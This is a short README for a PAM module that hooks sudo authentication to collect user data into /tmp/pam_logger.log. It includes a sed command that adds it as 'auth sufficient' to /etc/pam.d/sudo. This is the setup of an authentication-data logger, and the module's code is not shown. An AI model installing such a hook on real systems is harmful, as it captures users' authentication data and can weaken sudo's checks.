# PAM Logger
PAM module to collect user data

[![Hits-of-Code](https://hitsofcode.com/github/rdavid/pam_logger?branch=master)](https://hitsofcode.com/view/github/rdavid/pam_logger?branch=master)
[![License](https://img.shields.io/badge/license-0BSD-green)](https://github.com/rdavid/pam_logger/blob/master/LICENSE)

* [About](#about)
* [Install](#install)
* [License](#license)

## About
The module implements `pam_sm_authenticate` API to collect user data. The data
is adding to `/tmp/pam_logger.log`. Implemented and tested on Devian.
## Install
Disable authentication timeout for sudo:
```
https://askubuntu.com/questions/636092/how-to-get-sudo-to-prompt-you-for-a-password-each-time
```
Configure pam sudo:
```
sudo sed -i '2s/^/auth sufficient pam_logger.so/' /etc/pam.d/sudo
```
Compile and install the module:
```
make install
```
From this point all sudo commands will be logged at `/tmp/pam_logger.log`.
## License
PAM Logger is copyright [David Rabkin](http://davi.drabk.in) and
available under a [Zero-Claus BSD license](https://github.com/rdavid/pam_logger/blob/master/LICENSE).
